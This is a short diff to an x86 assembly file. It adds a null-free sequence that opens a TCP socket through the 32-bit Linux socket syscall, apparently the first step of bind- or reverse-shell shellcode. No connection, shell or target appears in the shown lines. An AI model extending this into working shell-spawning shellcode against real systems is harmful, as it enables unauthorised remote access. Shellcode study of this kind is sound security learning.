@@ -7,6 +7,17 @@ global _start
 
 section .text:
 _start:
+        xor eax, eax
+        xor ebx, ebx
+        xor ecx, ecx
+        xor edx, edx
+
+        mov eax, 0x167
+        mov bl, 0x2
+        mov cl, 0x1
+        mov dl, 6
+        int 0x80
+
         
 
 
